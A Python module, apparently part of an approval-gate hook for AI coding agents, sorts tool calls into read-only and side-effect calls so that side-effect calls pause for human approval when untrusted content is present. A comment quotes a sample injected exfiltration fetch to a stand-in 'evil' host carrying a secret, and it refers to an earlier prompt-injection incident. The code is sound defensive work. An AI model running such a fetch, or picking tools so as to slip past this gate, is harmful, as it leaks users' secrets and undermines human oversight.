"""ms-169 e-6236 — effect-based tool classification.

The ms-169 A gate (e-6237, a PreToolUse hook) must decide, for any tool the AI is
about to call, whether that tool has a *side effect* — it changes state or sends
something outward — because those are the calls that must pause for human
approval when untrusted content (see ``untrusted_frame``) is live in the turn.

The gate target is defined by **effect, not by tool family** (ms-169 方針3): a
local ``Write`` / ``Bash`` is dangerous, but an MCP tool that emails / posts to
Slack / writes Salesforce, or a Skill that sends a DM / posts to Discord /
deploys, is *more* outward and destructive. So this module classifies by what a
call DOES, across built-in tools, ``mcp__server__tool`` names, and Skills alike.

Fail-closed / default-deny (方針3): the ONLY calls classified read-only are ones
we can positively recognise as read-only (a built-in reader, or a name whose
verb is a known read verb with no write verb present). Everything else — an
unknown tool, a name with no recognisable verb, or any name carrying a write
verb — is a side effect (gate target). "When in doubt, gate."

This module is pure classification: it holds NO policy about *when* to gate (that
is the untrusted-turn condition, owned by e-6237) and performs no I/O. It answers
one question: "is this call read-only or a side effect?"
"""

from __future__ import annotations

import re

READ_ONLY = "read-only"
SIDE_EFFECT = "side-effect"

# Built-in Claude Code / Codex tools we can positively call read-only: they only
# observe local state and reach nothing outward. Exact-name match.
BUILTIN_READ_ONLY = frozenset({
    "Read",
    "Grep",
    "Glob",
    "LS",
    "NotebookRead",
    "TodoRead",
    "WebSearch",  # query to the configured search provider; no arbitrary sink
})

# Built-in tools that are always side effects regardless of arguments.
#   * Write / Edit / MultiEdit / NotebookEdit — mutate files.
#   * Bash — arbitrary command execution (the original ocean.txt injection ran
#     through a file write; Bash is the widest side-effect surface of all).
#   * WebFetch — issues a request to an ARBITRARY url, so it doubles as an
#     outward exfiltration channel (an injected「fetch https://evil/?x=<secret>」
#     leaks data even though it "reads"). Fail-closed → side effect.
#   * Task / Agent — spawns a subagent whose prompt could be steered by the
#     untrusted content; its downstream effects are unbounded. Default-deny.
BUILTIN_SIDE_EFFECT = frozenset({
    "Write",
    "Edit",
    "MultiEdit",
    "NotebookEdit",
    "Bash",
    "WebFetch",
    "Task",
    "Agent",
})

# Verb tokens that mark a WRITE / outward effect. Checked BEFORE read verbs so a
# mixed name (e.g. ``get_or_create_label``) classifies by its strongest effect.
WRITE_VERBS = frozenset({
    "send", "create", "write", "delete", "post", "update", "dml", "add",
    "remove", "modify", "move", "copy", "share", "trash", "upload", "insert",
    "append", "set", "edit", "reply", "draft", "execute", "run", "manage",
    "revoke", "grant", "deploy", "publish", "cancel", "accept", "decline",
    "respond", "join", "leave", "mark", "flag", "forward", "restore",
    "duplicate", "merge", "protect", "hide", "rename", "replace", "apply",
    "sync", "install", "mint", "issue", "approve", "reject", "clear", "done",
    "start", "stop", "halt", "resume", "put", "patch", "drop", "alter",
    "download",  # writes a local file from a remote source
})

# Verb tokens that mark a pure READ. Only honoured when NO write verb is present.
READ_VERBS = frozenset({
    "get", "list", "read", "search", "show", "describe", "view", "find",
    "query", "status", "about", "history", "replies", "unreads", "scopes",
    "info", "check", "detail", "details", "preview", "count",
})

# Split a tool / action name into lowercase verb tokens. Handles snake_case,
# kebab-case, dotted names, and camelCase (``listEvents`` → list, events).
_CAMEL_BOUNDARY = re.compile(r"(?<=[a-z0-9])(?=[A-Z])")
_SEP = re.compile(r"[^A-Za-z0-9]+")


def _tokens(name: str) -> list[str]:
    spaced = _CAMEL_BOUNDARY.sub(" ", str(name or ""))
    parts = _SEP.sub(" ", spaced).split()
    return [p.lower() for p in parts if p]


def _classify_by_verb(name: str) -> str:
    """Verb heuristic: write verb → side-effect, else read verb → read-only,
    else default-deny (side-effect). Write is checked first so the strongest
    effect wins on a mixed name."""
    toks = set(_tokens(name))
    if toks & WRITE_VERBS:
        return SIDE_EFFECT
    if toks & READ_VERBS:
        return READ_ONLY
    return SIDE_EFFECT  # no recognisable verb → default-deny


def _skill_name(tool_input) -> str:
    """Extract the skill name from a Skill tool invocation's input.

    The Skill tool carries the target skill in ``skill`` (Claude Code) or as the
    first token of ``command`` (leading slash tolerated). Returns "" if none
    found — the caller then falls back to default-deny on the bare "Skill" name.
    """
    if not isinstance(tool_input, dict):
        return ""
    skill = tool_input.get("skill") or tool_input.get("name")
    if isinstance(skill, str) and skill.strip():
        return skill.strip()
    command = tool_input.get("command")
    if isinstance(command, str) and command.strip():
        first = command.strip().split()[0]
        return first.lstrip("/")
    return ""


def classify_tool(tool_name: str, tool_input: object = None) -> str:
    """Return ``READ_ONLY`` or ``SIDE_EFFECT`` for one tool invocation.

    Resolution order:
      1. Skill tool → classify the *invoked skill* by its verb tokens
         (``beacon-dm-send`` → send → side-effect). A Skill with no resolvable
         name is default-deny.
      2. Exact built-in read-only / side-effect tables.
      3. ``mcp__server__tool`` → verb heuristic on the tool segment (after the
         last ``__``); MCP writes (send/create/update/dml/…) gate, MCP reads
         (get/list/search/…) pass, unknown MCP verb default-denies.
      4. Any other name → verb heuristic (covers generic / future tools).

    Fail-closed everywhere: an empty / non-string name is a side effect.
    """
    if not isinstance(tool_name, str) or not tool_name.strip():
        return SIDE_EFFECT
    name = tool_name.strip()

    if name == "Skill":
        skill = _skill_name(tool_input)
        return _classify_by_verb(skill) if skill else SIDE_EFFECT

    if name in BUILTIN_READ_ONLY:
        return READ_ONLY
    if name in BUILTIN_SIDE_EFFECT:
        return SIDE_EFFECT

    if name.startswith("mcp__"):
        # mcp__<server>__<tool[__…]>: classify by the tool segment. Guard the
        # degenerate ``mcp__server`` (no tool segment) as default-deny.
        segment = name.split("__", 2)[2] if name.count("__") >= 2 else ""
        return _classify_by_verb(segment) if segment else SIDE_EFFECT

    return _classify_by_verb(name)


def is_side_effect(tool_name: str, tool_input: object = None) -> bool:
    """True when the call changes state or sends outward (= a gate target)."""
    return classify_tool(tool_name, tool_input) == SIDE_EFFECT


__all__ = [
    "READ_ONLY",
    "SIDE_EFFECT",
    "BUILTIN_READ_ONLY",
    "BUILTIN_SIDE_EFFECT",
    "WRITE_VERBS",
    "READ_VERBS",
    "classify_tool",
    "is_side_effect",
]
